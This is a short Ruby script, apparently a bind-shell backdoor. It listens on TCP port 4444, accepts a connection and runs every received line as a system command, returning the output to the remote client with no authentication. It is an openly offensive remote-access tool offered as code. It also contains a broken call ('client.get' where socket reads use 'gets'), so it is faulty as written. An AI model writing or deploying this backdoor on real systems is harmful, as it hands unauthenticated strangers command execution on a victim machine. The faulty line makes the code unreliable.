require 'socket'

port = 4444

server = TCPServer.new(port)
puts "[*] Listening on port: #{port}"

client = server.accept
puts "[*] Connection established"

loop do
  client.print "shell>"

  command = client.get.chomp

  break if command.downcase == "exit"

  output = `#{command}`
  client.puts output
end

client.close
puts "[*] Connection closed"